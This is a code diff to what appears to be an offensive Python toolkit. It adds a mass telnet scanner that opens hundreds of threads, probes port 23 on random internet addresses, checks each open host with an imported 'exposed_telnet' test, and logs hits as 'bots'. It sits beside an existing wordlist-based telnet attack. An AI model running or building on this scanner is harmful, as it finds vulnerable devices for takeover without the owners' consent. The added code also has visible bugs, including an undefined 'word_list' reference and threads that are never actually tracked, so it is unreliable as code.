@@ -1,6 +1,6 @@
 import os,sys,socket,random,time,threading,smtplib,telnetlib
 from bane.payloads import *
-from bane.vulns import adb_exploit
+from bane.vulns import adb_exploit,exposed_telnet
 from ftplib import FTP
 linux=True
 if os.path.isdir('/data/data')==True:
@@ -146,6 +146,59 @@ def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_ran
  for x in range(threads):
   try:
    t=iott().start()
+   thr.append(t)
+  except:
+   pass
+ while (stop!=True):
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    stop=True
+    break
+ for x in thr:
+    try:
+      x.join(1)
+    except Exception as e:
+      pass
+    del x
+class iotelt(threading.Thread):
+ def run(self):
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
+   i=False
+   try:
+    so=socket.socket()
+    so.settimeout(3)
+    so.connect((ip,23))
+    i=True
+   except Exception as ex: 
+    pass
+   if i==True:
+     try:
+      q= exposed_telnet(ip)
+      if q==True:
+       print (ip)
+       write_file(ip,filen)
+     except Exception as e: 
+      pass
+def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None):
+ global stop
+ stop=False
+ global ip_seg
+ ip_seg=ip_range
+ create_file(filename)
+ global filen
+ filen=filename
+ global wordlist
+ wordlist=word_list
+ thr=[]
+ for x in range(threads):
+  try:
+   t=iotelt().start()
    thr.append(t)
   except:
    pass
